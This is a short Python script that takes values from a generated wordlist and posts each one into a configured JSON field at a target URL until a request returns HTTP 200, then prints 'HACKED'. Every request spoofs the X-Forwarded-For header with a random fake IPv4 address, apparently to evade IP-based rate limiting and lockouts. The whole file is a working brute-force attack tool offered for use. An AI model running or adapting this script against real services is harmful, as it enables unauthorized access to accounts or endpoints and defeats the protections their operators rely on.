import requests
import json
import csv
from faker import Faker
from createWordList import WordList

config = json.loads(open('./config.json').read())

faker = Faker()

print('Starting...')

# NOTE: if multiple then another arg value2 = ''


def send_request_to_url(config, headers={}, i=0, totalrows=0, value1=''):
    headers['Content-Type'] = 'application/json'
    headers['X-Forwarded-For'] = faker.ipv4()

    config['payload'][config["payloadValueReplace"]] = value1
    # NOTE: if multiple then add config['payload']['<value in payload>'] = value2

    response = requests.post(
        url=config['url'], headers=headers, json=config['payload'])

    if response.status_code == 200:
        percentage = int((float(i) / totalrows) * 100)
        print (str(percentage) + '%')
        print ('\n-----------HACKED-----------')

        print('\nRequest payload:')
        print(json.dumps(config['payload'], indent=2, sort_keys=True))

        print('\nRequest headers:')
        print(json.dumps(headers, indent=2, sort_keys=True))

        print('\nResponse status: ' + str(response.status_code))

        print ('\n-----------HACKED-----------')
        return True
    else:
        if i % 200 == 0:
            percentage = int((float(i) / totalrows) * 100)
            print (str(percentage) + '%')
        return False


WordList(config)


with open('WordList.csv') as csvfile:
    WordList = csv.DictReader(csvfile)
    rows = list(WordList)
    totalrows = len(rows)

    print('Running through wordList...')

    for i, row in enumerate(rows):

        if send_request_to_url(config, {}, i, totalrows, row['value1']):
            # NOTE: if multiple then use print(row['value1'], row['value2'])
            break
